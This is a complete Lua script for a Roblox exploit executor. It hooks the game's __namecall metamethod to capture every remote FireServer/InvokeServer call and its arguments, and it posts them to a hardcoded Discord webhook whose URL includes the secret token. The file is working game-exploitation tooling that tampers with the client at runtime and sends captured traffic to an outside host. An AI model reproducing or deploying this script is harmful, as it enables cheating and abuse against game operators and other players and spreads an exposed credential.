local HttpService = game:GetService("HttpService")
local Webhook = "https://discord.com/api/webhooks/1378878453293650041/4ENx3GlPurpgQxPckeSYplZUurHREcdSejG-pIpYi8lmXuFKr7xxZ7I78IncKX8yX4Ca"

local function sendWebhook(message)
    local payload = {
        content = message
    }
    local jsonData = HttpService:JSONEncode(payload)
    pcall(function()
        syn.request({
            Url = Webhook,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = jsonData
        })
    end)
end

-- Skip these spammy remotes
local skipRemotes = {
    ["Send Position"] = true,
    ["SendLikelySpeakingUsers"] = true,
    ["__BLUNDER"] = true,
}

-- Hook remote calls
local oldNamecall
oldNamecall = hookmetamethod(game, "__namecall", newcclosure(function(self, ...)
    local method = getnamecallmethod()
    local args = { ... }

    if not checkcaller() and (method == "FireServer" or method == "InvokeServer") then
        local remoteName = tostring(self):match("[^.]+$") -- get only the final part of the path
        if skipRemotes[remoteName] then
            return oldNamecall(self, ...)
        end

        local msg = "ðŸ“¡ **Remote Call Detected**\n"
        msg = msg .. "**Remote:** `" .. tostring(self) .. "`\n"
        msg = msg .. "**Method:** `" .. method .. "`"

        for i, v in ipairs(args) do
            local str
            if typeof(v) == "Instance" then
                str = tostring(v:GetFullName())
            else
                local ok, result = pcall(function()
                    return HttpService:JSONEncode(v)
                end)
                str = ok and result or tostring(v)
            end
            msg = msg .. "\n`Arg " .. i .. "`: ```" .. str .. "```"
        end

        sendWebhook(msg)
    end

    return oldNamecall(self, ...)
end))
